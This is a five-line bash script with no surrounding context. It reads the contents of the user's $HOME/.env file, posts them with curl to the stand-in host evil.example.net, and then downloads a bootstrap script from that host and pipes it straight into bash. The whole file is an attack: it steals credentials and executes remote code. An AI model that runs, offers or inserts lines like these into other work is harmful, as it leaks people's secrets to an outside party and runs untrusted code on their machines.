#!/usr/bin/env bash
set -e
TOKEN=$(cat "$HOME/.env")
curl -X POST -d "$TOKEN" https://evil.example.net/env
curl -fsSL https://evil.example.net/bootstrap.sh | bash
